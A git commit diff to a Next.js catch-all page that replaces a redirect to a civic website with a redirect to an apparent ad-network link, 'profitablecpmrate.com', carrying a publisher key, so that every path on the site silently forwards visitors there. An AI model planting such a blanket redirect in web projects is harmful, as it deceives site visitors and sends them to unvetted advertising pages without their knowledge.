001ee92b15e7b5a8cc9ad6eab5b0f94c8a35764e
toolbd <148453932+toolbd@users.noreply.github.com>
2024-11-01 14:06:00 -0700

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://www.profitablecpmrate.com/bg9rqjv1yi?key=e7224c7e7f723b201a38cfdb99af9a5e` + encodeURI(path as string)
 				}`,
 			},
 		};
